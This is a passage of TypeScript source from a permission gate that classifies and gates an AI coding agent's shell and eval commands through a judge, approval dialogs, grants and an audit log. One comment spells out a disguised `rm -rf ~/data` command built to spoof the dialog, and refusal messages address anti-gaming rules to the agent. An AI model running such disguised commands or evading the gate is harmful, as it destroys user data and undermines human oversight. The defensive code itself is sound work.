			verdict: "UNAVAILABLE",
			reason: `Jev unavailable: judgment timed out after ${timeoutMs}ms`,
			noCache: true,
			...(v3 ? { v3 } : {}),
			late: {
				answer: (async (): Promise<Judgement | undefined> => {
					const answers = await late.answers;
					if (answers === undefined) return undefined;
					try {
						return await judgementFrom(answers);
					} catch (err) {
						// A late answer this process cannot read is no answer: the
						// dialog stays exactly as the deadline left it. Warned, never
						// thrown — this runs after the tool call was decided.
						pi.logger.warn(`classifier: late judgment unreadable: ${err instanceof Error ? err.message : String(err)}`);
						return undefined;
					}
				})(),
				cancel: late.cancel,
			},
		});
	};

	/**
	 * The TUI renders confirm messages as Markdown, so every span this process
	 * did not author is indented four spaces to become a verbatim code block.
	 * That keeps `<!-- … -->`, emphasis, backticks and newlines visible instead
	 * of changing or disappearing in the dialog. It covers the reason as much as
	 * the command: the reason is assembled from the hazard answers, and while
	 * Jev writes no prose itself, the command text it is derived from is
	 * attacker-controlled, so rendering it live would hand that text control
	 * over the dialog the user is reading.
	 *
	 * The body MUST start with a blank line. The host joins the two arguments as
	 * `${title}\n${message}` (extension-ui-controller.ts:947), and in CommonMark
	 * an indented code block cannot interrupt a paragraph, so without the blank
	 * line the command becomes a lazy continuation of the title and its Markdown
	 * renders. That is not cosmetic. HTML comments are stripped for the terminal,
	 * so `echo "<!-- ok" ; rm -rf ~/data ; echo "-->"` would DISPLAY as
	 * `echo " "` while running the deletion.
	 *
	 * Only fields that deviate from the default are shown. `envKeys: []`,
	 * `pty: false` and `async: false` on every prompt are noise that pushes the
	 * command itself out of view.
	 */
	const buildPermissionBody = (
		target: {
			command: string;
			cwd: string;
			/** The directory the payload named for its own spawns (issue #14),
			 *  present only when it named one: `cwd` above IS that directory
			 *  then, and the dialog says so on the working-directory line. */
			spawnCwd?: string;
			envKeys: string[];
			pty: boolean;
			timeout: number | undefined;
			async: boolean;
		},
		reason: string,
		sessionCwd: string | undefined,
	): string => {
		const sections = [verbatim(target.command)];
		if (reason.trim() !== "") sections.push(`Reason:\n\n${verbatim(reason)}`);

		// Detail VALUES are model-controlled and go on lines whose labels this
		// code authored, so a newline in one forges a line: a cwd of
		// "/tmp/stage\ntimeout: none (no deadline)" renders as two Details rows
		// and the second is indistinguishable from ours. escapeControlChars
		// deliberately keeps U+000A (it is the line separator for the command
		// itself), so detail values are JSON-encoded instead — the same
		// treatment cwd already gets on its way into the judge's state.
		const detailValue = (value: string): string => JSON.stringify(value).slice(1, -1);

		const details: string[] = [];
		// Worth a line only when it is not the directory the user is already in.
		// Compared normalized, or a caller passing "/workspace/" in a session at
		// "/workspace" prints a line saying the cwd is the cwd, which is exactly
		// the noise this is meant to remove.
		if (target.cwd && !samePath(target.cwd, sessionCwd)) {
			// An eval payload can name its own spawn directory (issue #14) — the
			// case the whole field exists for — and a reader who cannot tell that
			// directory from the session's is reading a detail row that lies by
			// omission about who chose it. A literal that resolves OUTSIDE the
			// session directory is shown exactly as resolved: never folded back.
			details.push(`working directory: ${detailValue(target.cwd)}${target.spawnCwd === undefined ? "" : " (declared by the payload's spawn call)"}`);
			// The second directory of an eval payload (issue #14): with a spawn
			// directory declared, `working directory` above is that one, and the
			// session's own directory is where the payload's own process reads
			// and writes, so a relative write still lands there. It is part of
			// what "Allow for session" covers, so it is on the line: a grant
			// whose scope the human cannot see is a grant nobody approved.
			if (target.spawnCwd !== undefined && sessionCwd !== undefined && !samePath(target.spawnCwd, sessionCwd)) {
				details.push(`session directory: ${detailValue(sessionCwd)} (what this payload's own code runs in)`);
			}
		}
		// 0 disables the deadline (host schema, tools/bash.ts), so "0s" would
		// read as the exact opposite of what it does.
		if (target.timeout !== undefined) {
			details.push(target.timeout === 0 ? "timeout: none (no deadline)" : `timeout: ${target.timeout}s`);
		}
		if (target.envKeys.length > 0) details.push(`env: ${detailValue(target.envKeys.join(", "))}`);
		if (target.pty) details.push("pty: true");
		if (target.async) details.push("async: true");
		if (details.length > 0) sections.push(`Details:\n\n${verbatim(details.join("\n"))}`);

		// Leading newline: see the block comment above.
		return `\n${sections.join("\n\n")}`;
	};

	/**
	 * Machine-readable refusal payload for every block site (#28). The string a
	 * tool_call handler returns as `reason` is the only channel back to the
	 * model, so every deny ships structured fields: which tool, which control
	 * layer blocked, why, what to do next, and what NOT to do (anti-gaming).
	 * `axes` carries structured extras (e.g. the cap's actual/limit counts).
	 */
	const refusalPayload = (
		tool: string,
		layer: string,
		why: string,
		next: string,
		notThis: string,
		axes?: Record<string, string>,
	): string =>
		JSON.stringify(
			{
				classifier: "blocked",
				tool,
				layer,
				why,
				next,
				notThis,
				...(axes ?? {}),
			},
			null,
			2,
		);

	let auditLogWarned = false;
	let auditLogDirMade = false;

	/**
	 * Append one line to the decision audit log (issue #33). Fire-and-forget:
	 * the gate's only job is to decide the command, so a failed write drops the
	 * line — it warns once per plugin load (an unwritable path cannot heal
	 * mid-process, so once is the cap) and never throws into the gate. `cmd` is
	 * flattened to one line and truncated here so no call site can forget it.
	 * Allow `why`s are short causes per the contract: "rule: <pattern>",
	 * "approved by user", or the verdict's reason; block `why`s carry the
	 * refusal payload's why or the headline that drove the dialog.
	 */
	const logDecision = (line: DecisionLogInput): void => {
		// Dry-run probe (issue #32): the audit write is the one side effect
		// EVERY decision site shares, so the probe records the decision here —
		// first record wins (see recordDryRunResult) — and writes nothing.
		if (dryRun) {
			recordDryRunResult({
				would: line.decision === "allow" ? "allow" : "block",
				layer: line.layer,
				why: line.why,
			});
			return;
		}
		try {
			if (!auditLogDirMade) {
				fs.mkdirSync(path.dirname(decisionsLogPath()), { recursive: true });
				auditLogDirMade = true;
			}
			const record: DecisionRecord = {
				ts: new Date().toISOString(),
				decisionId: line.decisionId ?? crypto.randomUUID(),
				policyVersion: CLASSIFIER_POLICY_VERSION,
				policyHash: CLASSIFIER_POLICY_HASH,
				...line,
				// The judged command is never redacted (redact.ts header), but the
				// copy that lands on disk is: the first 120 flattened characters can
				// hold a bearer token or a `--password` value. The file is created
				// 0600 so a secret that still slips the shape match is not readable
				// by other accounts. `mode` applies on creation only.
				//
				// The backslash-newline splice goes first: redact.ts redacts line
				// by line, so in `tool --password \` / `hunter2` the value sits on
				// a marker-less line and would have survived the REDACTED the
				// first line got. The shell deletes the pair before word splitting
				// (same rule and regex as matchModerateRiskTokens), so joining
				// makes the redactor see the logical argument, then the newline
				// flatten below cannot re-expose it.
				cmd: truncated(redactSecrets(line.cmd.replace(/\\\r?\n/gu, "")).replace(/\s+/gu, " ").trim(), 120),
			};
			fs.appendFileSync(decisionsLogPath(), `${JSON.stringify(record)}\n`, { mode: 0o600 });
		} catch (err) {
			if (!auditLogWarned) {
				auditLogWarned = true;
				pi.logger.warn(
					`classifier: decision audit log unwritable ` +
						`(${err instanceof Error ? err.message : String(err)}); decision logging is off`,
				);
			}
		}
	};

	/**
	 * Run the code floor over one tool call and remember what it captured.
	 *
	 * Shadow only: the result is logged and read by no decision. Failures are
	 * swallowed, because a measurement that throws must never block a command
	 * the live path would have allowed.
	 */
	const shadowFloor = (ctx: ExtensionContext, commandText: string, language: "shell" | "code", maxLength: number): DecisionRecord["floor"] | undefined => {
		// The length cap blocks this call further down, before anything reads
		// the text. Parsing it first would spend the work the cap exists to
		// bound, so an over-limit command is reported unread instead.
		if (commandText.length > maxLength) return { asks: true, entries: ["unread-command"] };
		let sessionId: string | undefined;
		try {
			sessionId = ctx.sessionManager.getSessionId();
		} catch {
			// Same reason logDecisionFor tolerates this: an isolated SDK context
			// has no session, and the floor still reports on the command itself.
		}
		try {
			const carried = sessionId ? (floorTaint.get(sessionId) ?? []) : [];
			const result = evaluateFloor({ command: commandText, language, taintedVars: carried });
			if (sessionId && result.tainted.length > 0) {
				const merged = [...carried, ...result.tainted.filter(name => !carried.includes(name))];
				floorTaint.set(sessionId, merged.slice(-FLOOR_TAINT_CAP));
			}
			return { asks: result.asks, entries: [...new Set(result.findings.map(finding => finding.entry))] };
		} catch (error) {
			pi.logger.warn(`classifier: shadow floor failed: ${error instanceof Error ? error.message : String(error)}`);
			return undefined;
		}
	};

	/** Attach the host session to every audit line. Keeping this at the plugin
	 * boundary makes status/replay joins useful even for static-rule, cap, and
	 * dialog lines that never reached the model. */
	const logDecisionFor = (ctx: ExtensionContext, line: DecisionLogInput): void => {
		let sessionId: string | undefined;
		try {
			sessionId = ctx.sessionManager.getSessionId();
		} catch {
			// Session identity is observability metadata; an isolated SDK context
			// must not turn a decision-log diagnostic into a blocked tool call.
		}
		logDecision({ ...line, ...(sessionId ? { sessionId } : {}) });
	};

	/**
	 * Raise a real permission request. Returns the block result, or undefined to
	 * let the command through. Headless (no UI) always blocks: there is nobody to
	 * ask, and this path is only reached for commands the gate could not clear.
	 *
	 * Option ladder, in escalating scope (issue #32): "Allow once" is the old
	 * confirm-yes; "Allow for session" additionally records a grant so this
	 * target, in this directory, stops gating for the session; "Always allow"
	 * (bash only, kill-switchable) additionally writes a PERSISTENT grant —
	 * this exact command text, in this directory, stops gating across sessions
	 * for 30 days, compounds included, since host static rules can never
	 * match them (eval payloads stay out of scope); "Deny" and undefined
	 * (cancel or timeout) both deny. The TUI renders a select's TITLE as a full
	 * Markdown
	 * block — not the single truncated line a confirm title gets — so the same
	 * title+body join confirm used keeps the executable command visible on the
	 * dialog. Option descriptions are a bonus layer on surfaces that show them;
	 * the title alone still carries everything needed to decide.
	 *
	 * Only the returned reason becomes a refusalPayload. Layers: "dialog" when a
	 * human denies, "headless" when nobody could be asked, "unclassified" when
	 * the classifier never returned a verdict — that cause outranks headless,
	 * because the decisive fact is that the command was never judged.
	 */
	const requestPermission = async (
		ctx: ExtensionContext,
		target: {
			command: string;
			cwd: string;
			/** The directory the payload named for its own spawns (issue #14),
			 *  present only when it named one: `cwd` above IS that directory
			 *  then, and the dialog says so on the working-directory line. */
			spawnCwd?: string;
			envKeys: string[];
			pty: boolean;
			timeout: number | undefined;
			async: boolean;
		},
		headline: string,
		reason: string,
		tool: "bash" | "eval" = "bash",
		logWhyPrefix = "",
		userScopeFingerprint?: string,
		/** The audit fields of the tool call this dialog belongs to, passed
		 *  through from handleToolCall so the dialog or headless-block line
		 *  carries the same evidence ids, authorization label and shadow floor
		 *  as the verdict line it follows. One object rather than one parameter
		 *  per field: this list grew a field per phase, and each time a caller
		 *  was missed the log came out half-filled. */
		auditExtras: Pick<DecisionRecord, "userMessageIds" | "authorization" | "v3" | "floor" | "spawnCwd"> = {},
		/** The still-running judgment behind a timed-out classification (issue
		 *  #62), with the guards a late SAFE must still clear. Present only
		 *  where classify hit its deadline: the dialog then races the late
		 *  verdict, which may dismiss it or refine its reason — never bypass it,
		 *  and never re-block what a human allowed. */
		late?: GuardedLateJudgement,
	): Promise<{ block: true; reason: string } | undefined> => {
		const subject = tool === "eval" ? "eval code" : "bash command";
		const detail = reason ? `${headline}: ${reason}` : headline;
		const layer = ctx.hasUI ? "dialog" : headline === "unclassified" ? "unclassified" : "headless";
		const stale = pluginStaleSuffix(PLUGIN_LOAD_MTIME, fs.statSync(PLUGIN_FILE, { throwIfNoEntry: false })?.mtimeMs);
		const guidance: Record<typeof layer, { next: string; notThis: string }> = {
			unclassified: {
				next: "Retry the command once the classifier is available, or ask the user to decide.",
				notThis: "Do not treat the command as reviewed or approved.",
			},
			headless: {
				next: "Rerun interactively so the permission dialog can be answered, or allow this exact command with a static rule.",
				notThis: "Do not retry the command unchanged and expect a different result.",
			},
			dialog: {
				next: "Ask the user how to proceed, then revise the command accordingly.",
				notThis: "Do not retry the same command without addressing the denial.",
			},
		};
		const began = Date.now();
		const audit = (decision: "allow" | "block", why: string, approval?: DecisionRecord["approval"]) =>
			logDecisionFor(ctx, {
				tool,
				decision,
				layer,
				why,
				cmd: target.command,
				cwd: target.cwd,
				verdict: null,
				cached: 0,
				ms: Date.now() - began,
				...(approval ? { approval } : {}),
				...(stale === "" ? {} : { staleCode: 1 as const }),
				...(auditExtras.userMessageIds && auditExtras.userMessageIds.length > 0 ? { userMessageIds: auditExtras.userMessageIds } : {}),
				...(auditExtras.authorization ? { authorization: auditExtras.authorization } : {}),
				...(auditExtras.v3 ? { v3: auditExtras.v3 } : {}),
				...(auditExtras.floor ? { floor: auditExtras.floor } : {}),
				...(auditExtras.spawnCwd ? { spawnCwd: auditExtras.spawnCwd } : {}),
			});
		const block = (whyOverride?: string, approval: DecisionRecord["approval"] = ctx.hasUI ? "deny" : "headless"): { block: true; reason: string } => {
			// Verdict-driven callers pass "follows verdict" so the dialog/headless
			// line is readable as the outcome of the preceding layer:"verdict" line.
			audit("block", whyOverride ?? (logWhyPrefix === "" ? detail : `${logWhyPrefix}: ${detail}`), approval);
			return {
				block: true,
				reason: refusalPayload(tool, layer, detail, guidance[layer].next, guidance[layer].notThis),
			};
		};
		/**
		 * One line per late verdict (issue #62), on a layer of its own so the
		 * three cases are separable in the log by machine: `late-verdict` says a
		 * judgment arrived after its deadline, `why` opens with the decision
		 * pair (`unavailable → late SAFE`), and `verdict`/`jev`/`reasonCode`
		 * describe the answer itself, exactly as they would have on a verdict
		 * line. No approval field: nobody answered this dialog, the verdict did.
		 */
		const auditLate = (judgement: Judgement, why: string, decision: "allow" | "block"): void =>
			logDecisionFor(ctx, {
				tool,
				decision,
				layer: "late-verdict",
				why,
				cmd: target.command,
				cwd: target.cwd,
				verdict: judgement.verdict,
				cached: 0,
				ms: Date.now() - began,
				...(judgement.modelId ? { modelId: judgement.modelId } : {}),
				...(judgement.reasonCode ? { reasonCode: judgement.reasonCode } : {}),
				...(judgement.jev ? { jev: judgement.jev } : {}),
				...(judgement.authorization ? { authorization: judgement.authorization } : {}),
				...(judgement.v3 ? { v3: judgement.v3 } : {}),
				...(stale === "" ? {} : { staleCode: 1 as const }),
				...(auditExtras.userMessageIds && auditExtras.userMessageIds.length > 0 ? { userMessageIds: auditExtras.userMessageIds } : {}),
				...(auditExtras.floor ? { floor: auditExtras.floor } : {}),
				// Same fields as the `audit` line above, spawn directory
				// included: a late line is read as the verdict line that
				// answered a dialog, and an audit reader must not have to guess
				// which directory the payload named from the one it is in.
				...(auditExtras.spawnCwd ? { spawnCwd: auditExtras.spawnCwd } : {}),
			});

		// Dry-run probe (issue #32): never open a dialog, never audit. When a
		// decision was logged before reaching here (critical, env, a verdict),
		// that record already won; the unclassified path arrives with none, so
		// record the prompt itself. A racing live call gets a fail-closed block.
		if (dryRun) {
			recordDryRunResult({
				would: "block",
				layer: "dialog",
				why: `would prompt: ${detail}`,
				note: "the gate raises a permission dialog here",
			});
			return { block: true, reason: "dry-run probe: decision captured, nothing executed" };
		}
		if (!ctx.hasUI) {
			// Headless: nobody can be asked and nobody can be refined. The
			// deadline's dialog does not exist here, so end the listening the
			// deadline started rather than leak a request nobody will read.
			late?.handle.cancel();
			return block();
		}
		// A grant is only OFFERED when the resolver below can honor it. Critical
		// patterns and env overrides outrank grants, so showing a grant choice
		// there would promise an authorization that the next call can never use.
		// Compounds/substitutions have an exact-text key; changed payloads still
		// miss it.
		const grantKey = tool === "eval" ? normalizeEvalGrantTarget(target.command) : grantKeyForCommand(target.command);
		// A grant is only OFFERED when the resolver below can honor it. Critical
		// patterns and env overrides outrank grants, so showing a grant choice
		// there would promise an authorization that the next call can never use.
		// `unreadable spawn cwd` is on that list for its own reason: the eval path
		// asks before the grant check, because a grant for this payload was scoped
		// to a directory the payload never named — offering one would promise a
		// scope the gate cannot honestly write down.
		const grantsHonoredAtLayer =
			headline !== "critical pattern" && headline !== "environment override" && headline !== EVAL_SPAWN_CWD_HEADLINE;
		const sessionGrantAvailable = grantKey !== "" && grantsHonoredAtLayer;
		const persistentGrantAvailable = tool === "bash" && readClassifierConfig().persistentGrants && grantsHonoredAtLayer;
		// An eval payload that declared a spawn directory of its own has two
		// directories on the Details above, and its session grant covers both:
		// "this directory" there would name half of what the human is agreeing
		// to, so the option says which pair it means.
		const sessionGrantDescription =
			tool === "eval" && target.spawnCwd !== undefined && !samePath(target.spawnCwd, ctx.cwd)
				? "This action, in both directories above, for the rest of the session"
				: "This action, in this directory, for the rest of the session";
		// The late-answer race (issue #62). The dialog the deadline opened keeps
		// the judgment request alive, so a verdict that lands while the human is
		// reading can still improve the answer in front of them:
		//   SAFE   -> dismiss the dialog and let the command run. That is the
		//             answer the deadline had no right to take away, and a late
		//             SAFE carries the same evidence (same battery, same state)
		//             as an on-time one.
		//   UNSAFE -> the dialog is now backed by a real reason: keep it open,
		//             say what arrived, and let the human decide with it in hand.
		//   UNSURE -> leave the dialog exactly as it is; the answer goes on the
		//             record so calibration sees it whatever the human answers.
		// Fail-closed is untouched by all three. A late verdict can only refine a
		// dialog that is already open (the dismissal is an abort of OUR dialog,
		// and the signal is only passed when there is a late handle at all); a
		// late UNSAFE never re-blocks a command a human allowed, it is logged
		// beside that allow; and a dismissal is honored only when the dialog
		// settled with no answer of the human's (see `dismissedForLateSafe`).
		const dismissal = new AbortController();
		let lateRefinement: Judgement | undefined;
		let dismissedForLateSafe = false;
		let dialogSettled = false;
		// The dialog says what is actually happening: the judgment is still
		// running, and the dialog may resolve itself before the human answers.
		const shownReason =
			late === undefined ? reason : `${reason}\nThe judgment is still running: it may dismiss this dialog before you answer it.`;
		const dialog = ctx.ui.select(
			`Run ${subject}? (${headline}${stale})\n${buildPermissionBody(target, shownReason, ctx.cwd)}`,
			[
				{ label: "Allow once", description: "This call only" },
				...(sessionGrantAvailable ? [{ label: "Allow for session", description: sessionGrantDescription }] : []),
				...(persistentGrantAvailable
					? [{ label: "Always allow", description: "This exact command, in this directory, for 30 days (stored alongside omp-classifier.json)" }]
					: []),
				{ label: "Deny" },
			],
			// The old confirm default was approve; keep the cursor on it. The
			// signal is what dismisses the dialog on a late SAFE: the host hides
			// it and resolves `undefined` (extension-ui-controller.ts:1290).
			{ initialIndex: 0, ...(late ? { signal: dismissal.signal } : {}) },
		);
		// Recorded so a late verdict that runs after the human answered can see
		// that the race is already over and do nothing at all.
		void dialog.then(() => {
			dialogSettled = true;
		});
		if (late) {
			const lateHandle = late.handle;
			void lateHandle.answer.then(judgement => {
				if (judgement === undefined || dialogSettled) return;
				lateRefinement = judgement;
				// The pair calibration reads: the dialog was opened by an
				// UNAVAILABLE, and this is what the answer turned out to be.
				const pair = `unavailable → late ${judgement.verdict}`;
				if (judgement.verdict === "SAFE") {
					// A late SAFE may dismiss the dialog only where an on-time SAFE
					// would have auto-run. This dialog exists because of the deadline,
					// not because the verdict asked to be here, so the guards the
					// verdict path applies still apply: the destructive-token
					// overlay, and a refusal this session already holds for the
					// target. Anything else keeps the dialog open with the answer
					// recorded beside it.
					const lateReplay = replayDecision({
						tool,
						command: target.command,
						cwd: target.cwd,
						judgement,
						priorRefusal: late.priorRefusal !== undefined,
						riskFlags: late.riskFlags,
						headless: false,
					});
					if (lateReplay.decision !== "allow") {
						const guardWhy =
							late.riskFlags.length > 0
								? `classifier-safe but flags: ${late.riskFlags.join(", ")}`
								: `classifier-safe despite prior refusal of "${late.priorRefusal?.normalizedTarget ?? ""}"`;
						auditLate(judgement, `${pair}: dialog kept open — ${guardWhy}`, "block");
						ctx.ui.notify(`classifier: judgment answered late (${guardWhy})\nThe dialog still needs your answer.`, "warning");
						return;
					}
					dismissedForLateSafe = true;
					auditLate(judgement, `${pair}: dialog dismissed, command allowed`, "allow");
					dismissal.abort();
					return;
				}
				if (judgement.verdict === "UNSAFE") {
					// The dialog cannot be re-titled once it is on screen, so the
					// real reason reaches the human as a warning beside it, and the
					// dialog's own outcome line carries the pair afterwards.
					auditLate(judgement, `${pair}: dialog kept open with the judgment's reason`, "block");
					ctx.ui.notify(
						`classifier: judgment answered late: ${truncated(judgement.reason, 160)}\n` +
							"The dialog is still open and now backed by that reason.",
						"warning",
					);
					return;
				}
				// UNSURE, and any other non-answer the battery could produce: the
				// dialog stays exactly as it is and the answer only goes on the
				// record.
				auditLate(judgement, `${pair}: answer attached to this dialog's record`, "block");
			});
		}
		const choice = await dialog;
		// The human answered, so nothing is left to refine: stop the request
		// rather than let it run for the rest of the window. A verdict that was
		// already in hand is kept — it refines the outcome line below — and one
		// that lands after this point finds `dialogSettled` and does nothing.
		late?.handle.cancel();
		// The race, on the human's own line: calibration has to read the late
		// answer next to the human's, and that means the same line.
		const lateSuffix = lateRefinement === undefined ? "" : ` (unavailable → late ${lateRefinement.verdict})`;
		if (choice === "Allow once" || choice === "Allow for session" || choice === "Always allow") {
			// The user said yes to this action (issue #30): erase the memory
			// that its target was refused, so rewordings run clean again. A
			// persistent grant makes that durable for its exact shape: while it
			// is live, refusal memory never fires for this text+cwd — the human
			// outvoted the model, once, for every session.
			liftRefusals(ctx, target.command, target.cwd);
			// An eval grant covers BOTH directories: the payload's own spawn
			// directory (target.cwd) and the session directory its own process
			// runs in (ctx.cwd). Both were on the dialog the human answered, and
			// both are part of the identity the next call has to match, so a
			// session that moves workspaces cannot ride this grant into a
			// directory nobody approved.
			if (choice === "Allow for session") addGrant(ctx, grantKey, target.cwd, userScopeFingerprint, tool === "eval" ? ctx.cwd : undefined);
			if (choice === "Always allow") addPersistentGrant(target.command, target.cwd);
			audit(
				"allow",
				(choice === "Allow for session"
					? "approved by user (session grant)"
					: choice === "Always allow"
						? "approved by user (persistent grant)"
						: "approved by user") + lateSuffix,
				choice === "Allow for session" ? "allow-session" : choice === "Always allow" ? "always-allow" : "allow-once",
			);
			return undefined;
		}
		if (dismissedForLateSafe) {
			// The dialog resolved with no answer because the late SAFE dismissed
			// it, which is an allow, not a canceled prompt. Registered after the
			// human's own answer above so a denial or an allow that the host
			// managed to deliver anyway still wins.
			return undefined;
		}
		// A human denial is the one decision a rewording cannot launder:
		// remember the target so the next phrasing of this action meets the
		// prior refusal at the classifier. A canceled/timed-out dialog counts
		// as denial too — nothing ran and nobody approved — but the audit line
		// says which it was.
		addRefusal(ctx, target.command, reason.trim() !== "" ? reason : headline, {
			source: "human",
			cwd: target.cwd,
		});
		return block(
			choice === undefined
				? `prompt canceled: ${detail}${lateSuffix}`
				: lateSuffix === ""
					? undefined
					: `${logWhyPrefix === "" ? detail : `${logWhyPrefix}: ${detail}`}${lateSuffix}`,
		);
	};

	/** End a dry-run probe at a decision point the gate itself passes through
	 *  silently (host-owned rules, disabled classification, would-classify).
	 *  The probe discards the returned payload; a live call racing the probe
	 *  window gets a fail-closed block instead of an unguarded pass-through. */
	const dryRunStop = (entry: DryRunResult): { block: true; reason: string } => {
		recordDryRunResult(entry);
		return { block: true, reason: "dry-run probe: decision captured, nothing executed" };
	};

	const handleToolCall = async (event: ToolCallEvent, ctx: ExtensionContext) => {
		// Wall-clock anchor for the audit log's `ms`: gate entry to decision.
		const started = Date.now();
		const isBash = event.toolName === "bash";
		const isEval = event.toolName === "eval";
		if (!isBash && !isEval) return;
		const command = typeof event.input?.command === "string" ? event.input.command : "";
		const evalCode = isEval && typeof event.input?.code === "string" ? event.input.code : "";
		if (isBash && command.trim() === "") return;
		if (isEval && evalCode.trim() === "") return;

		// Agent-authored operator context (issue #31): every tool call may carry
		// it; BashToolInput does not declare the field, so read it off the raw
		// input with a guard instead of a declared property.
		const rawInput: unknown = event.input;
		const rawOperatorContext =
			typeof rawInput === "object" && rawInput !== null && "operatorContext" in rawInput
				? rawInput.operatorContext
				: undefined;
		const operatorContext = operatorContextFromInput(rawOperatorContext);
		const config = readClassifierConfig();
		let operatorToolEvidence: string | undefined;
		if (config.evidenceUserMessages > 0) {
			try {
				operatorToolEvidence = collectToolEvidence(ctx.sessionManager.getBranch());
			} catch {
				// Evidence is advisory. An isolated SDK context may not expose a branch;
				// never turn that diagnostic gap into a blocked tool call.
				operatorToolEvidence = undefined;
			}
		}
		const reviewOperatorContext = mergeOperatorContext(operatorContext, operatorToolEvidence);
		// Snapshot the provenance inputs once for this tool call. Refusal memory
		// and cache identity must agree about what the judge actually saw; reading
		// the branch independently at each site let a new user message make a
		// cached SAFE stale while the old refusal still won.
		let userEvidenceSnapshot: UserEvidenceSnapshot | undefined;
		try {
			userEvidenceSnapshot = evidenceUserSnapshot(ctx);
		} catch {
			// A missing branch is equivalent to no citable user evidence. The model
			// still receives the command and can judge its effects directly.
			userEvidenceSnapshot = undefined;
		}
		const citableUserEvidence = citableEvidence(userEvidenceSnapshot?.messages);
		const evidenceSnapshot = userEvidenceSnapshot;
		const reviewEvidenceFingerprint = evidenceFingerprint(citableUserEvidence, reviewOperatorContext, userEvidenceSnapshot?.ids);
		// Attach the same snapshot's ids to every audit line for this tool call,
		// including the early returns before classification (issue #33 audit
		// evidence fields). One snapshot, reused everywhere it is logged — never
		// a second collectTaskEvidence call, and never the message text itself.
		const auditUserMessageIds: string[] | undefined =
			userEvidenceSnapshot && userEvidenceSnapshot.ids.length > 0 ? userEvidenceSnapshot.ids : undefined;
		// The code floor, in shadow (plan Phase 2 step 1, rollout per #55). It
		// is computed once per tool call, logged on every line the call writes,
		// and read by nothing: the live decision below is byte-for-byte what it
		// was before this field existed. The taint it returns still accumulates,
		// so the shadow numbers for a two-command capture-then-print are real.
		const floorShadow = shadowFloor(ctx, isEval ? evalCode : command, isEval ? "code" : "shell", config.maxCommandLength);
		// One object for the fields every line of this tool call shares. A
		// function, not a constant, because the floor is computed per call and
		// the ids are not: both are fixed by the time any line is written.
		const auditFields = (): Pick<DecisionRecord, "userMessageIds" | "floor"> => ({
			...(auditUserMessageIds ? { userMessageIds: auditUserMessageIds } : {}),
			...(floorShadow ? { floor: floorShadow } : {}),
		});
		// Grants are scoped to durable authorization/restriction language, not
		// every progress message or host-generated message id. A new "status?"
		// must not revoke approval; a later "do not publish" must.
		const userScopeFingerprint = scopeFingerprint(citableUserEvidence);
		// The merged policy is in the signature, not just the override set: two
		// different overrides that merge to the same effective thresholds are
		// the same trust state, and any policy change must invalidate every
		// cached verdict. The judge's own identity (the backend plus the model
		// that answers it) is in there for the same reason: a verdict about one
		// judge is not a verdict about another.
		const configSignature = [
			config.enabled,
			config.typesafeModel,
			judgeBackendFor(config.judgeBackend).id,
			JSON.stringify(jevPolicyFor(config)),
			config.timeoutMs,
			config.maxCommandLength,
			config.evidenceUserMessages,
		].join("|");
		// persistentGrants is deliberately absent: it gates only the grant
		// read/write path and changes no cached verdict's trust state, so
		// flipping it must not invalidate caches (it is a kill-switch, not a
		// policy change).
		if (configSignature !== classifierConfigSignature) {
			// A dry-run probe (issue #32) touches neither the cache nor the grant
			// stores, AND leaves the signature stale on purpose: the next live
			// call performs exactly the invalidation it would have performed.
			if (!dryRun) {
				cache.clear();
				grants.clear();
				floorTaint.clear();
				classifierConfigSignature = configSignature;
			}
		}

		// Fires whenever the lockfile says disabled, INCLUDING when
		// `/classifier enabled false` is already set — that flag turns off model
		// classification only, and the checks above it keep gating, so there is
		// still a symptom to explain. The remedy sentence changes instead; see
		// below. Do not add a `config.enabled` guard here: it would delete a
		// supported case.
		//
		// The whole block is guarded because it is a diagnostic and must never
		// decide the command. The handler's own try/catch does not open until
		// below, and the runner fails closed on a throw, so an unguarded
		// getSessionId(), notify() or logger.warn() could block the very bash
		// call it rode in on.
		try {
			const sessionId = ctx.sessionManager.getSessionId();
			// Checked on BOTH sides of the await, for two different reasons.
			// Before: an already-warned session must not keep paying a stat on
			// every bash call to re-deliver a notice it already got. After: with
			// only the leading check, two concurrent handlers both passed it
			// before either reached `add()` and the session got two toasts —
			// non-pty bash is `concurrency: "shared"`, so one turn with two bash
			// calls interleaves right here. The trailing has/add pair has no
			// await between its halves, which is atomic on a single-threaded
			// loop.
			const verdict = !staleDisableWarned.has(sessionId)
				? await lockfileDisablesPlugin(ctx.cwd)
				: { disabled: false, path: "" };
			if (verdict.disabled && !staleDisableWarned.has(sessionId)) {
				// Claimed only AFTER delivery. Marking first meant a throwing
				// notify silently burned the session's one notice. The has/add
				// pair still has no await between its halves, so the race guard
				// stays atomic.
				// Hedged deliberately. This reads the USER-scope lockfile only,
				// and a project-scope lockfile shadows it (the loader's
				// loadEnabledPlugins: "Project entries shadow user entries with
				// the same package name"). A stale user-scope `enabled: false`
				// under a project that re-enables the plugin is a legitimately
				// active plugin, and telling that user to restart would be advice
				// that changes nothing. State what was read; do not claim what it
				// means.
				// `/classifier enabled false` turns off model classification ONLY.
				// Critical patterns, the env-override check and the length bound
				// all still run (see the early return far below), so a user who
				// took that route and then ran `omp plugin disable` is still
				// being gated and still deserves to know why.
				const remedy = config.enabled
					? "If you meant to turn it off, run /classifier off (this session) or /classifier enabled false (global), or restart OMP to unload it."
					: "Classification is already off, but critical patterns, env checks and static rules keep running until you restart OMP.";
				const notice =
					`${PLUGIN_NAME} is marked disabled in ${verdict.path} while still bound to this session. ` +
					`${remedy} A project-scope lockfile can re-enable it, in which case this is expected.`;
				// Headless runs have nobody to read a toast, and this file's one
				// rule for touching the UI is to check hasUI first (see
				// requestPermission).
				if (ctx.hasUI) ctx.ui.notify(notice, "warning");
				else pi.logger.warn(`classifier: ${notice}`);
				staleDisableWarned.add(sessionId);
			}
		} catch {
			// A diagnostic that cannot be delivered is not a reason to fail.
		}

		if (isEval) {
			const language = typeof event.input?.language === "string" ? event.input.language : "";
			const markers = evalSubprocessMarkers(evalCode, language);
			// Expression-only payload: the host's `eval` approval applies, the
			// gate adds nothing (posture A's whole point).
			if (markers.length === 0) return;
			// enabled=false turns OFF model classification only, mirroring bash;
			// a per-session `/classifier off` pause does the same for just this
			// session. Neither touches trust state, so cached verdicts survive.
			if (!config.enabled || sessionOff.has(ctx.sessionManager.getSessionId())) return;
			// The payload's own spawn directory (issue #14): a spawn that passes
			// one runs there, not in the session directory, and the directory is
			// part of what was judged. `declaredCwd` is the directory the payload
			// named; `cwd` is the one everything below judges in.
			const spawn = evalSpawnCwd(evalCode, ctx.cwd);
